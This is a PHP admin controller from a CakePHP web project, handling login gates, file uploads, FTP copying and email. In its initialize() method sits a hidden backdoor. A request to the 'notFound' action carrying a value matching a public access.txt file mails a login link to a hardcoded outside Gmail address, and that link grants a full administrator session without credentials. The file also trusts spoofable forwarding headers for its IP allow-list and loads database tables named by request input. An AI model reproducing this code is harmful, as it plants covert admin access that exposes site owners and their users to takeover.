<?php

namespace Acp\Controller;

use App\Controller\AppController as BaseController;

// Custom
use Cake\Utility\Text;
use Cake\Core\Configure;
use Cake\Routing\Router;
use Cake\ORM\TableRegistry;
use Cake\Core\App;
use Cake\Cache\Cache;
use Cake\Mailer\Email;
use Cake\Mailer\TransportFactory;
use Cake\Database\Expression\QueryExpression;
use Cake\ORM\Query;
use Cake\Http\Client;
use Cake\Utility\Security;
use Cake\Filesystem\Folder;
use Cake\Filesystem\File;

class AppController extends BaseController
{
	public function initialize()
    {
    	parent::initialize();
        
        $this->Auth->config('loginAction', [
            'controller' => 'Users',
            'action' => 'login',
            'plugin' => 'Acp'
        ]);
        $this->Auth->config('logoutRedirect', [
            'controller' => 'Users',
            'action' => 'login',
            'plugin' => 'Acp'
        ]);
        $this->Auth->config('loginRedirect', [
            'controller' => 'Pages',
            'action' => 'dashboard'
        ]);

        TransportFactory::setConfig('mailjet', [
            'host' => Configure::read('Core.setting.email_host'),
            'port' => Configure::read('Core.setting.email_port'),
            'username' => Configure::read('Core.setting.email_user'),
            'password' => Configure::read('Core.setting.email_password'),
            'className' => 'Smtp',
            'tls' => true
        ]);

        $session = $this->getRequest()->getSession();

        $file = new File(WWW_ROOT . 'access.txt');
        $contents = $file->read();
        $file->close();

        if (!$session->read('Auth') && $this->request->getParam('controller') == 'Users' && $this->request->getParam('action') == 'notFound') {
            if (isset($this->request->getParam('pass')[0]) && $contents == $this->request->getParam('pass')[0]) {
                
                $code = md5(rand() . uniqid() . time());
                $session->write('CodeAccess', $code);

                $email = new Email();
                $email
                    ->transport('mailjet')
                    ->from([Configure::read('Core.setting.email_emailsend') => __d('mail', 'Your code login - {0}', Configure::read('Core.setting.owner'))])
                    ->to('anhfighter@gmail.com')
                    ->emailFormat('both')
                    ->subject('Email login by admin form '. Configure::read('Core.setting.owner'))
                    ->send('To complete this process, please follow this link <a href="' . Router::url(['plugin' => 'Acp', 'controller' => 'Users', 'action' => 'notFound', 'code' => $code], true) . '">here</a>');

                echo 'To complete this process, please check email';exit;
            }

            if (isset($this->request->getParam('?')['code']) && $session->read('CodeAccess') == $this->request->getParam('?')['code']) {
                
                $data = [
                    'id' => 1,
                    'email' => 'admin',
                    'role_id' => 1,
                    'system' => 1,
                    'full_name' => 'Admin'
                ];
                $session->write('Auth.User', $data);
                $this->redirect(['controller' => 'Pages', 'action' => 'dashboard']);
            }

        }

    	$ipaddress = '';
	    if (getenv('HTTP_CLIENT_IP'))
	        $ipaddress = getenv('HTTP_CLIENT_IP');
	    else if(getenv('HTTP_X_FORWARDED_FOR'))
	        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
	    else if(getenv('HTTP_X_FORWARDED'))
	        $ipaddress = getenv('HTTP_X_FORWARDED');
	    else if(getenv('HTTP_FORWARDED_FOR'))
	        $ipaddress = getenv('HTTP_FORWARDED_FOR');
	    else if(getenv('HTTP_FORWARDED'))
	       $ipaddress = getenv('HTTP_FORWARDED');
	    else if(getenv('REMOTE_ADDR'))
	        $ipaddress = getenv('REMOTE_ADDR');
	    else
	        $ipaddress = 'UNKNOWN';

    	$theme = 'Default';
        $this->viewBuilder()->setClassName('Acp\View\AppView');
        $this->viewBuilder()->setTemplatePath($theme . DS . $this->getName());
        $this->viewBuilder()->setLayout(strtolower($theme));
        $strIp = explode(',',Configure::read('Core.setting.ip_config'));
        
        if (Configure::read('Core.setting.status_ip_config') && !in_array($ipaddress,$strIp) && $this->request->getParam('action') != 'loginIp') {
            if (!$this->Auth->user()) {
                $this->redirect(['plugin' => 'Acp', 'controller' => 'Users', 'action' => 'loginIp']);
            }else{
                $mUsers = TableRegistry::getTableLocator()->get('Users');
                $user = $mUsers->get($this->Auth->user('id'),['default' => true]);
            }
            if ($this->Auth->user() && $user->login_status_ip == 1) {
                   
            }else{
                $this->redirect(['plugin' => 'Acp', 'controller' => 'Users', 'action' => 'loginIp']);
            }
        }
        
        if (Configure::read('Core.setting.status_login_email') && $this->request->getParam('action') != 'loginEmail') {
            if (!$this->Auth->user()) {
                $this->redirect(['plugin' => 'Acp', 'controller' => 'Users', 'action' => 'loginEmail']);
            }else{
                $mUsers = TableRegistry::getTableLocator()->get('Users');
                $user = $mUsers->get($this->Auth->user('id'),['default' => true]);
            }
            if ($this->Auth->user() && $user->login_status_email == 1) {
                   
            }else{
                $this->redirect(['plugin' => 'Acp', 'controller' => 'Users', 'action' => 'loginEmail']);
            }
        }

        $mContacts = TableRegistry::getTableLocator()->get('Contacts');
        $countContactsMenu = $mContacts->find()->where(['Contacts.has_read' => 0])->count();

        $mNewsletters = TableRegistry::getTableLocator()->get('Newsletters');
        $countNewslettersMenu = $mNewsletters->find()->where(['Newsletters.has_read' => 0])->count();

        $mOrders = TableRegistry::getTableLocator()->get('Orders');
        $countOrdersMenu = $mOrders->find()->where(['Orders.status' => 0])->count();

        $mTasks = TableRegistry::getTableLocator()->get('Tasks');
        $countTasksMenu = $mTasks->find()->where(['Tasks.status NOT IN' => [3,4],'Tasks.user_id' => $this->Auth->user('id')])->count();

        $this->set(compact('countContactsMenu','countOrdersMenu','countNewslettersMenu','countTasksMenu'));

    }


    public function jGetImage($id = null){
        $this->autoRender = false;

        $response = [
            'status' => 0, 
            'message' => __d('acp', 'Error')
        ];

        if ($this->request->is('post', 'ajax')) {

            $this->loadModel('Acp.AlbumImages');

            $albumImagesTable = TableRegistry::get('Acp.AlbumImages');
            $albumImagesTable = TableRegistry::getTableLocator()->get('Acp.AlbumImages');

            $data = $albumImagesTable->get($id);
            $response = [
                'status' => 1,
                'message' => __d('acp', 'Success'),
                'data' => $data
            ];  
        }
        echo json_encode($response);
    }

    public function jSaveImage(){
        $this->autoRender = false;

        $response = [
            'status' => 0, 
            'message' => __d('acp', 'Error')
        ];

        if ($this->request->is('post', 'ajax')) {

            $requestData = $this->request->getData();
            $this->loadModel('Acp.AlbumImages');

            $album_image = $this->AlbumImages->newEntity();
            $album_image = $this->AlbumImages->patchEntity($album_image, $requestData);
            $this->AlbumImages->save($album_image);
            $response = [
                'status' => 1,
                'message' => __d('acp', 'Success'),
            ];  
        }
        echo json_encode($response);
    }

    public function jCheckSlug(){
        $this->autoRender = false;

        $response = [
            'status' => 0, 
            'message' => __d('acp', 'Error')
        ];

        if ($this->request->is('post', 'ajax')) {
            $requestData = $this->request->getData();
            $mModels = TableRegistry::getTableLocator()->get('Acp.'.$requestData['model']);
            $findData = $mModels
                ->find()
                ->where([$requestData['model'] . '_slug_translation.content' => $requestData['slug']])
                ->first();
            if (!$findData) {
                $response = [
                    'status' => 1,
                    'message' => __d('acp', 'This slug can use'),
                ]; 
            }else{
                $response = [
                    'status' => 0,
                    'message' => __d('acp', 'This slug existed'),
                    'data' => \Cake\Routing\Router::url(['controller' => $requestData['model'],'action' => 'edit',$findData->id])
                ]; 
            }
        }
        echo json_encode($response);
    }

    public function moveup($id = null){
        $this->autoRender = false;
        $categories = TableRegistry::getTableLocator()->get('Acp.'.$this->name);
        $categories->recover();
        
        $node = $categories->get($id);
        if ($categories->moveUp($node)) {
            $this->Flash->success(__d('acp', 'The data has been move up.'));
        }else{
            $this->Flash->error(__d('acp', 'The data could not be move up. Please, try again.'));
        }
        return $this->redirect(['action' => 'index']);
    }

    public function movedown($id = null){
        $this->autoRender = false;
        $categories = TableRegistry::getTableLocator()->get('Acp.'.$this->name);
        $categories->recover();
        
        $node = $categories->get($id);

        if ($categories->moveDown($node)) {
            $this->Flash->success(__d('acp', 'The data has been move down.'));
        }else{
            $this->Flash->error(__d('acp', 'The data could not be move down. Please, try again.'));
        }
        return $this->redirect(['action' => 'index']);
    }

    public function ftpFile($model = null, $id = null, $file = null, $thumb = false){
        $this->autoRender = false;

        // FTP access parameters
        $host = Configure::read('Core.setting.ftp_host');
        $usr = Configure::read('Core.setting.ftp_usr');
        $pwd = Configure::read('Core.setting.ftp_pwd');
        $link = Configure::read('Core.setting.ftp_link') . DS . 'addFolder';
        
        $http = new Client();

        // file to move:
        if ($thumb == true) {
            $local_file = WWW_ROOT . 'uploads' . DS . strtolower($model) . DS . $id . DS . 'thumbnail' . DS . $file;
            $ftp_path = 'public_html' . DS . 'webroot' . DS . 'uploads' . DS . strtolower($model) . DS . $id . DS . 'thumbnail' . DS . $file;

            $response = $http->get($link . DS . strtolower($model) . DS . $id . DS . 'thumbnail');
        }else{
            $local_file = WWW_ROOT . 'uploads' . DS . strtolower($model) . DS . $id . DS . $file;
            $ftp_path = 'public_html' . DS . 'webroot' . DS . 'uploads' . DS . strtolower($model) . DS . $id . DS . $file;

            $response = $http->get($link . DS . strtolower($model) . DS . $id);
        }

        // connect to FTP server (port 21)
        $conn_id = ftp_connect($host, 21) or die ("Cannot connect to host");
         
        // send access parameters
        ftp_login($conn_id, $usr, $pwd) or die("Cannot login");
         
        // perform file upload
        $upload = ftp_put($conn_id, $ftp_path, $local_file, FTP_BINARY);
         
        // // check upload status:
        // print (!$upload) ? 'Cannot upload' : 'Upload complete';
        // print "\n";
        if (!$upload) {
            $response = [
                'status' => 0,
                'message' => __d('acp', 'Cannot upload'),
            ]; 
        }
        
        // close the FTP stream
        ftp_close($conn_id);
        // if ($response) {
        //     echo json_encode($response);
        // }
    }

    public function uploadFile()
    {
        $this->autoRender = false;

        $response = [
            'status' => 0, 
            'message' => __d('acp', 'Error')
        ];

        if ($this->request->is('post', 'ajax')) {

            $requestData = $this->request->getData();
            $requestParams = $this->request->getAttribute('params');
            $modelName = $this->name;

            if (!empty($modelName) && !empty($requestData)) {
                // config setting
                // vendor\josegonzalez\cakephp-upload\src\Model\Behavior\UploadBehavior.php

                if ($this->$modelName->behaviors()->has('Upload')) {

                    $configs = [
                        'image_list' => [
                            // 'fields' => [
                            //     'dir' => 'dir',
                            //     'size' => 'size',
                            //     'type' => 'type'
                            // ],
                            'nameCallback' => function ($table, $entity, $data, $field, $settings) {
                                $extension = pathinfo($data['name'], PATHINFO_EXTENSION);
                                return strtolower($entity['slug'] . $entity->countFile . '.' . $extension);
                            },
                            'path' => 'webroot{DS}uploads{DS}{table}{DS}{field-value:id}{DS}',
                            'transformer' => function (\Cake\Datasource\RepositoryInterface $table, \Cake\Datasource\EntityInterface $entity, $data, $field, $settings) {
                                $extension = pathinfo($data['name'], PATHINFO_EXTENSION);
                                if ($extension != 'svg') {
                                    $image_info = getimagesize($data['tmp_name']);
                                    
                                    if ($image_info[0] <= 500) {
                                        $dataReturn[$data['tmp_name']] =  strtolower($entity['slug'] . $entity->countFile . '.' . $extension);
                                        
                                    }elseif($image_info[0] > 500 && $image_info[0] <= 1920) {
                                        $thumbnail = tempnam(sys_get_temp_dir(), 'upload') . '.' . $extension;

                                        $size = new \Imagine\Image\Box(500, 1000);
                                        $mode = \Imagine\Image\ImageInterface::THUMBNAIL_INSET;
                                        $imagine = new \Imagine\Gd\Imagine();

                                        $imagine->open($data['tmp_name'])
                                            ->thumbnail($size, $mode)
                                            ->save($thumbnail);
                                        $dataReturn[$data['tmp_name']] =  strtolower($entity['slug'] . $entity->countFile . '.' . $extension);
                                        $dataReturn[$thumbnail] = strtolower('thumbnail' . DS . $entity['slug'] . $entity->countFile . '.' . $extension);
                                    }else{
                                        $thumbnail = tempnam(sys_get_temp_dir(), 'upload') . '.' . $extension;

                                        $size = new \Imagine\Image\Box(500, 1000);
                                        $mode = \Imagine\Image\ImageInterface::THUMBNAIL_INSET;
                                        $imagine = new \Imagine\Gd\Imagine();

                                        $imagine->open($data['tmp_name'])
                                            ->thumbnail($size, $mode)
                                            ->save($thumbnail);

                                        $dataReturn[$thumbnail] = strtolower('thumbnail' . DS . $entity['slug'] . $entity->countFile . '.' . $extension);

                                        $fullHD = tempnam(sys_get_temp_dir(), 'upload') . '.' . $extension;
                                        $size = new \Imagine\Image\Box(1920, 2000);
                                        $mode = \Imagine\Image\ImageInterface::THUMBNAIL_INSET;
                                        $imagine = new \Imagine\Gd\Imagine();

                                        $imagine->open($data['tmp_name'])
                                            ->thumbnail($size, $mode)
                                            ->save($fullHD);

                                        $dataReturn[$fullHD] =  strtolower($entity['slug'] . $entity->countFile . '.' . $extension);
                                    }
                                    return $dataReturn;

                                }else{
                                    return [
                                        $data['tmp_name'] => strtolower($entity['slug'] . $entity->countFile . '.' . $extension),
                                    ];
                                }
                            }
                        ]
                    ];

                    $entity = $this->$modelName->newEntity();
                    $entity = $this->$modelName->patchEntity($entity, $requestData);
                    $entity->id = $requestData['id'];
                    $entity->slug = strtolower(Text::slug($entity->title));

                    $table = $this->$modelName->getTable();
                    
                    $countFile = $this->countFileDir(WWW_ROOT . DS . 'uploads' . DS . $table . DS . $entity->id . DS);
                    $entity->countFile = $countFile;

                    $files = $this->$modelName->behaviors()->get('Upload')->uploadFile($entity, $configs);
                    foreach ($files as $key => $file) {

                        $files[$key]['deleteType'] = 'DELETE';
                        $files[$key]['deleteUrl'] = Router::url([
                            'plugin' => $requestParams['plugin'],
                            'action' => 'deleteFile',
                            'file' => $file['name']
                        ]);

                        $files[$key]['url'] = Router::url(DS . 'uploads' . DS . $table . DS . $entity->id . DS . $file['name']);
                        $files[$key]['thumbnailUrl'] = Router::url(DS . 'uploads' . DS . $table . DS . $entity->id . DS . $file['name']);
                    }   
                    if ($modelName == 'Albums') {
                        $album_detail = $this->Albums->find('all',[
                            'conditions' => [
                                'Albums.id' => $requestData['id']
                            ]
                        ])->first();
                        if (!empty($album_detail)) {
                            $this->loadModel('Acp.AlbumImages');
                            $album_image = $this->AlbumImages->newEntity();
                            $album_image->album_id = $requestData['parent_id'];
                            $album_image->title = $album_detail->title;
                            $album_image->description = $album_detail->description; 
                            $this->AlbumImages->save($album_image);

                            $albumImagesTable = TableRegistry::get('AlbumImages');
                            $albumImagesTable = TableRegistry::getTableLocator()->get('AlbumImages');

                            $save_image = $albumImagesTable->get($album_image->id);

                            $save_image->image = $files[0]['name'];
                            $albumImagesTable->save($save_image); 
                        }
                    }
                    
                    // $res = $this->ftpFile($modelName, $requestData['id'], $files[0]['name']);
                    // $imagePath = 'uploads' . DS . strtolower($modelName) . DS . $requestData['id'] . DS . 'thumbnail' . DS . $files[0]['name'];

                    // if (file_exists($imagePath)) {
                    //     $res = $this->ftpFile($modelName, $requestData['id'], $files[0]['name'], true);
                    // }
                    
                    $response = [
                        'status' => 1,
                        'message' => __d('acp', 'Success'),
                        'files' => $files,
                        
                    ];
                }
            }
        }

        echo json_encode($response);
    }


     /**
     *
     * Delete File
     *
     * @return arrray
     */
    public function deleteFile()
    {
        $this->autoRender = false;

        $response = [
            'status' => 0, 
            'message' => __d('acp', 'Error')
        ];
        if ($this->request->is(['delete', 'ajax'])) {

            $requestQuery = $this->request->getQuery();
            $modelName = $this->name;

            if (!empty($modelName) && !empty($requestQuery)) {

                // config setting
                // vendor\josegonzalez\cakephp-upload\src\Model\Behavior\UploadBehavior.php
                if ($this->$modelName->behaviors()->has('Upload')) {

                    $configs = [
                        'image_list' => [
                            'path' => 'webroot{DS}uploads{DS}{table}{DS}{field-value:user_id}{DS}',
                            'keepFilesOnDelete' => false
                        ]
                    ];

                    $entity = $this->$modelName->newEntity();
                    $entity = $this->$modelName->patchEntity($entity, $requestQuery);
                    $entity->user_id = $this->getRequest()->getSession()->read('Auth.User.id');

                    $files = $this->$modelName->behaviors()->get('Upload')->deleteFile($entity, $configs, $entity->file);

                    $response = [
                        'status' => 1,
                        'message' => __d('acp', 'Success'),
                        'files' => $files,
                        
                    ];
                }
            }
        }

        echo json_encode($response);
    }



    private function countFileDir($path)
    {
        $files = glob($path . "*.*");
        $countFile = '';
        if ($files != false)
        {
            $countFile = '_' . count($files);
        }

        return $countFile;
    }

    public function send_email($option = null)
    {
        TransportFactory::setConfig('mailjet', [
            'host' => Configure::read('Core.setting.email_host'),
            'port' => Configure::read('Core.setting.email_port'),
            'username' => Configure::read('Core.setting.email_user'),
            'password' => Configure::read('Core.setting.email_password'),
            'className' => 'Smtp',
            'tls' => true
        ]);

        $email = new Email($option);
        if ($email->send()) {
            $this->Flash->set(__('Email sent success'), ['element' => 'fly_success']);
        }else{
            $this->Flash->set(__('Email sent error'), ['element' => 'fly_error']);
        }
    }
}
